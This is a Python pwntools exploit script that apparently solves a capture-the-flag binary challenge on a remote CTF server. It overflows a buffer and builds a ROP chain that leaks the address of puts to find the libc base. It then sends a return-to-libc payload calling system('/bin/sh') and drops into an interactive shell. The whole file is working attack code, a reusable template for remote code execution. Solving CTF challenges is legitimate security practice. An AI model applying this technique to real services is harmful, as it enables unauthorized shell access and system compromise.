from pwn import *

# r = process('./libc_sequel.dms')
r = remote('ctf99.cs.ui.ac.id', 9131)

libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')

# collect address of system and /bin/sh
system_offset = libc.symbols['system']
binsh_offset = list(libc.search(b'/bin/sh'))[0]
puts_offset = libc.symbols['puts']

print('[*] system offset:', hex(system_offset))
print('[*] binsh offset:', hex(binsh_offset))

# find libc base address pake puts
e = ELF('./libc_sequel.dms')
rop = ROP(e)

PUTS = e.plt['puts']
GETS = e.plt['gets']

LIBC_START_MAIN = 0x804C014
PUTS_GOT = 0x0804c010
# GET_GOT = 0x0804c00c
POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0] # 0x08049022

payload = b'A'*20
payload += p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(GETS)
with open('payload', 'wb') as out:
	out.write(payload)
r.sendlineafter('shell', payload)
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
# print(r.recvline())
recieved = r.recv(10)
leak  = hex(u32(recieved[4:8].ljust(4, b'\x00')))
print('LEAKED:', leak)

PUT_ADDR = int(leak, 16)

LIBC_BASE = PUT_ADDR - puts_offset
print(hex(LIBC_BASE))

# assemble payload for system('/bin/sh')
system_address = LIBC_BASE + system_offset
binsh_address = LIBC_BASE + binsh_offset
payload += p32(system_address)
payload += p32(POP_EBX)
payload += p32(binsh_address)
r.sendline(payload)
# r.interactive()




r.interactive()